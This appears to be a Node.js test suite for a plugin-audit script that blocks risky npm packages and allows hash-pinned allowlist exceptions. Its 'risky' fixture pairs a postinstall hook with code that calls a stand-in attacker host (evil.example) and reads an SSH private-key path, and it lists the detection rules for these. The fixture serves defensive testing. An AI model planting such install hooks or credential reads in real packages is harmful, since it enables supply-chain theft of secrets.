import assert from 'node:assert/strict'
import { mkdtemp, mkdir, writeFile, rm } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { spawnSync } from 'node:child_process'
import test from 'node:test'

const script = join(import.meta.dirname, '..', 'audit-plugin.mjs')

function run(args) {
  return spawnSync(process.execPath, [script, ...args], { encoding: 'utf8' })
}

async function fixture(root, name, manifest, files) {
  const dir = join(root, name)
  await mkdir(dir, { recursive: true })
  await writeFile(join(dir, 'package.json'), JSON.stringify(manifest, null, 2))
  for (const [file, content] of Object.entries(files)) {
    await mkdir(join(dir, file, '..'), { recursive: true })
    await writeFile(join(dir, file), content)
  }
  return dir
}

test('benign package passes', async () => {
  const root = await mkdtemp(join(tmpdir(), 'dsh-audit-'))
  try {
    const dir = await fixture(root, 'benign', { name: 'benign', version: '1.0.0' }, { 'index.js': 'export const answer = 42\n' })
    const result = run([dir, '--json'])
    assert.equal(result.status, 0, result.stderr)
    const report = JSON.parse(result.stdout)
    assert.equal(report.verdict, 'pass')
    assert.equal(report.counts.high, 0)
  } finally { await rm(root, { recursive: true, force: true }) }
})

test('risky package blocks with expected findings', async () => {
  const root = await mkdtemp(join(tmpdir(), 'dsh-audit-'))
  try {
    const dir = await fixture(root, 'risky', {
      name: 'risky',
      version: '1.0.0',
      scripts: { postinstall: 'node install.js' },
      bin: { risky: 'index.js' },
    }, {
      'index.js': "import { execSync } from 'node:child_process'\nfetch('https://evil.example/x')\nconst key = process.env.HOME + '/.ssh/id_rsa'\n",
    })
    const result = run([dir, '--json'])
    assert.equal(result.status, 2)
    const report = JSON.parse(result.stdout)
    assert.equal(report.verdict, 'block')
    const rules = new Set(report.findings.map(finding => finding.rule))
    for (const rule of ['lifecycle-script', 'child-process', 'credential-path', 'network-api']) {
      assert.ok(rules.has(rule), `missing ${rule}`)
    }
  } finally { await rm(root, { recursive: true, force: true }) }
})

test('an exact allowlist entry clears a blocked package', async () => {
  const root = await mkdtemp(join(tmpdir(), 'dsh-audit-'))
  try {
    const dir = await fixture(root, 'risky', {
      name: 'risky', version: '1.0.0', scripts: { postinstall: 'node install.js' },
    }, { 'index.js': "import { execSync } from 'node:child_process'\n" })
    const hash = run([dir, '--print-hash']).stdout.trim()
    const allowlist = join(root, 'allowlist.json')
    await writeFile(allowlist, JSON.stringify({ plugins: [{ name: 'risky', version: '1.0.0', contentHash: hash, approved: '2026-11-22' }] }))
    const result = run([dir, '--allowlist', allowlist, '--json'])
    assert.equal(result.status, 0)
    const report = JSON.parse(result.stdout)
    assert.equal(report.verdict, 'allowlisted')
  } finally { await rm(root, { recursive: true, force: true }) }
})
